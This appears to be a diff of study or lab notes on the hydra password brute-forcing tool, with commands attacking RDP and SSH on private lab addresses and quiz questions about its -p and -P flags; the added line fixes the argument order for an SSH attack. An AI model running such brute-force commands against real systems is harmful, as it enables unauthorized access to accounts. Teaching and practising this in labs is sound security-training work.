@@ -14,5 +14,7 @@ sudo hydra -l badguy -p password_list.txt rdp://192.168.1.20
 Explain what the different is between a -P and a lower -p in hydra.
 sudo hydra -l badguy -p password_list.txt rdp://10.254.7.50
 sudo hydra -l bad guy -P 22 passwd.txt 10.254.7.68 
+
+sudo hydra -l bad guy -P passwd.txt 10.254.7.68 22
   What service are we attacking
 here?
